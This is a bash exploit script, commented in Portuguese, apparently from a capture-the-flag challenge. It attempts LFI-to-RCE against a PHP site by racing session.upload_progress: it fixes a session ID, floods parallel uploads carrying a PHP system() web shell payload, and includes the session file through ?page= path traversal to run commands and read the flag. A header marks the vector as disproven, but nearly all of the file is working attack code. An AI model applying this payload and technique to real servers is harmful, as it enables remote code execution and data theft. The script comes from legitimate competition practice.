#!/usr/bin/env bash
# ===========================================================================
# [FALSIFICADO — NÃO RODAR] Vetor morto. Repro local (php:8.1) provou que o
# `php -S` bufferiza o corpo inteiro do POST antes de processar: não existe
# janela "durante o upload", então o session.upload_progress nunca é escrito a
# tempo — independe da versão do PHP. Mantido só como registro da trilha.
# Vetor vivo: traversal-LFI (?page=) + escrita por ?note= → include. Ver WRITEUP.md.
# ===========================================================================
# ---------------------------------------------------------------------------
# Le Filtre Magique — LFI2RCE via session.upload_progress (race)
#
# Mecânica:
#   - SID fixo (session fixation) -> nome de arquivo previsível: sess_<SID>
#   - WRITERS: POST multipart continuo com o campo magico
#       PHP_SESSION_UPLOAD_PROGRESS = <payload PHP>
#     O PHP guarda a CHAVE  upload_progress_<payload>  no $_SESSION e serializa
#     no arquivo de sessao em disco ENQUANTO le o corpo do upload. Com
#     cleanup=On o dado some quando o POST termina -> janela curta -> por isso
#     os uploads sao grandes/lentos e em paralelo (mantem a janela sempre aberta).
#   - READER: inclui o sess_<SID> via ?page= (sem ://, o filtro nem ve) nos
#     candidatos de save_path. 1 acerto dentro da janela = RCE.
#
# Uso:   ./race.sh            # executa 'id'
#        ./race.sh 'cat /flag*'
# ---------------------------------------------------------------------------
set -u

H='https://filtre-magique.cyberzerk.fr'
SID='race0rce0race0rce'                 # alnum, use_strict_mode=0 (default) aceita
PAY='<?php system($_GET["c"]); ?>'      # vira parte da CHAVE da sessao
CMD="${1:-id}"
TIMEOUT=180                             # teto de seguranca (s)
NWRITERS=8
BIGSZ=1500000                           # ~1.5 MB -> alarga a janela de leitura

# candidatos de save_path, RELATIVOS a base de include /app/pages/
CANDS=(
  "../sess_$SID"                        # /app/sess_<SID>   (CWD provavel)
  "../../tmp/sess_$SID"                 # /tmp/sess_<SID>
  "../../var/lib/php/sessions/sess_$SID" # fallback Debian
)

urlenc() { printf %s "$1" | sed -e 's/ /%20/g' -e 's/&/%26/g'; }
CMDENC=$(urlenc "$CMD")

TMP=$(mktemp -d)
BIG="$TMP/big"; STOP="$TMP/stop"
head -c "$BIGSZ" /dev/zero | tr '\0' 'A' > "$BIG"

echo "[*] alvo   = $H"
echo "[*] SID    = $SID   (sess_$SID)"
echo "[*] payload= $PAY"
echo "[*] cmd    = $CMD"
echo "[*] subindo $NWRITERS writers + reader (Ctrl-C para abortar)"
echo

writer() {
  while [ ! -f "$STOP" ]; do
    curl -s -o /dev/null -m 15 -b "PHPSESSID=$SID" "$H/" \
      --form-string "PHP_SESSION_UPLOAD_PROGRESS=$PAY" \
      -F "f=@$BIG;filename=x" 2>/dev/null
  done
}
WPIDS=()
for _ in $(seq "$NWRITERS"); do writer & WPIDS+=($!); done

cleanup() { touch "$STOP" 2>/dev/null; kill "${WPIDS[@]}" 2>/dev/null; wait 2>/dev/null; rm -rf "$TMP"; }
trap 'echo; echo "[-] abortado"; cleanup; exit 130' INT

try=0; start=$(date +%s); found=""
while :; do
  for c in "${CANDS[@]}"; do
    try=$((try+1))
    out=$(curl -s -m 10 -b "PHPSESSID=$SID" "$H/?page=$c&c=$CMDENC" 2>/dev/null)
    if printf %s "$out" | grep -qa 'uid='; then
      found="$c"; printf %s "$out" > "$(dirname "$0")/race_hit.txt"
      break 2
    fi
    # tambem detecta flag direta (caso cmd ja seja um cat)
    if printf %s "$out" | grep -qa 'CyberZerk{'; then
      found="$c"; printf %s "$out" > "$(dirname "$0")/race_hit.txt"
      break 2
    fi
  done
  now=$(date +%s); el=$((now-start))
  printf "\r[.] tentativas=%-6d  %3ds  (ainda sem acerto)   " "$try" "$el"
  if [ "$el" -ge "$TIMEOUT" ]; then echo; echo "[-] timeout ${TIMEOUT}s sem RCE"; break; fi
done

echo
if [ -n "$found" ]; then
  echo "[+] RCE! save_path candidato = $found"
  echo "---------------- saida ----------------"
  # imprime so o trecho util (depois do lixo serializado)
  grep -aoE 'uid=[^<]*|CyberZerk\{[^}]*\}' "$(dirname "$0")/race_hit.txt" | head
  echo "---------------------------------------"
  echo "[+] saida completa em: $(dirname "$0")/race_hit.txt"
  echo "[>] proximo: ./race.sh 'cat /flag*'   ou   ./race.sh 'grep -ro CyberZerk{ / 2>/dev/null'"
fi
cleanup
